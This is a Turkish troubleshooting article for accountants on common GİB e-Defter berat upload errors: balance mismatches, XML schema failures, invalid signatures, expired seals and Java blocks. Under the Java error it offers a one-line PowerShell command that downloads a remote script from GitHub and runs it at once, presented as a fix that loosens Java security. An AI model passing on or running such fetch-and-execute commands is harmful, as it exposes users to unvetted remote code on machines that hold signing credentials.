# En Sık Karşılaşılan e-Defter Berat Yükleme Hataları ve Çözümleri 🚨🛠️

> **Kategori:** e-Defter & Beratlar  
> **Hedef Kitle:** Mali Müşavirler, Muhasebeciler, ERP Yazılımcıları  
> **Tahmini Okuma Süresi:** 6 dakika  
> **Son Güncelleme:** 2026

---

## 📌 Giriş: GİB Berat Yükleme Redleri

e-Defter beratlarını GİB portalına (`uyg.edefter.gov.tr`) yüklerken Gelir İdaresi sistemi saniyeler içinde otomatik bir şema, imza ve balans denetimi yapar. Hata tespit edilirse dosya doğrudan reddedilir.

İşte en yaygın 5 hata ve adım adım kesin çözümleri:

---

## ❌ Hata 1: "Borç ve Alacak Toplamları Eşit Değil! (Balans Hatası)"

* **Neden Olur:** Muhasebe programınızda yuvarlama farkları, silinmiş mahsup fişi veya dengesiz yevmiye maddesi kalmıştır.
* **GİB Kuralı:** Toplam borç tutarı ile toplam alacak tutarı kuruşu kuruşuna eşit olmak zorundadır. 0.01 TL'lik fark dahi beratı engeller.
* **Çözüm:** Muhasebe programınızda "Yevmiye Maddesi Kontrolü" çalıştırın. Dengesiz fişi tespit edip düzeltin ve berat XML dosyasını baştan oluşturun.

---

## ❌ Hata 2: "Şema Doğrulama Hatası (XML Schema Validation Failed)"

* **Neden Olur:** XML dosyasında Türkçe özel karakterlerin bozuk kodlanması (UTF-8 encoding eksikliği) veya zorunlu alanların (`<gl-cor:documentDate>`, `<identifier>`, `<accountTitle>`) boş bırakılması.
* **Çözüm:** XML dosyasını bir metin düzenleyiciyle açarak `<?xml version="1.0" encoding="UTF-8"?>` başlığını kontrol edin. Karakterlerin bozulmadığından emin olun.

---

## ❌ Hata 3: "İmza Doğrulanamadı / İmza Geçersiz (Signature Invalid)"

* **Neden Olur:**
  1. Defter XML dosyası oluşturulup imzalandıktan sonra üzerinde elle herhangi bir değişiklik yapılmıştır.
  2. Akıllı kart sürücüsü (AKİS) imzalama sırasında yarım kalmış veya bozuk hash üretmiştir.
* **Çözüm:** İmzalanmış bir XML dosyası üzerinde asla düzenleme yapmayın. Defteri muhasebe yazılımınızdan baştan üretip sıfırdan imzalayın.

---

## ❌ Hata 4: "Mali Mühür Sertifikasının Süresi Dolmuş"

* **Neden Olur:** Kamu SM sertifikanızın 3 yıllık süresi bitmiştir.
* **Çözüm:** Zaman kaybetmeden Kamu SM üzerinden yenileme başvurusu yapın. Acil durum için Rehber 08'deki GİB Mücbir Sebep Dilekçesi adımlarını uygulayın.

---

## ❌ Hata 5: "GİB Java Güvenlik Engeli / Applet Açılamıyor"

* **Neden Olur:** İnternet tarayıcısı veya Windows Java güvenlik seviyesi GİB portalının imza bileşenini engellemektedir.
* **Çözüm:** Java Exception Site List'e GİB adreslerini ekleyin. Açık kaynaklı [gib-java-guvenlik-cozucu](https://github.com/eimza-kep/gib-java-guvenlik-cozucu) aracımızı çalıştırarak tek tıkla onarabilirsiniz:

```powershell
irm https://raw.githubusercontent.com/eimza-kep/gib-java-guvenlik-cozucu/main/Fix-JavaSecurity.ps1 | iex
```

---

## 📋 Yükleme Öncesi Kontrol Listesi (Checklist)

- [ ] Yevmiye madde numaraları 1'den başlayıp kesintisiz devam ediyor mu?
- [ ] Borç ve alacak toplamları 0.00 TL fark ile denk mi?
- [ ] Önceki ayın kapanış yevmiye numarası ile bu ayın açılış numarası ardışık mı?
- [ ] Takılı mali mührün süresi geçerli mi?
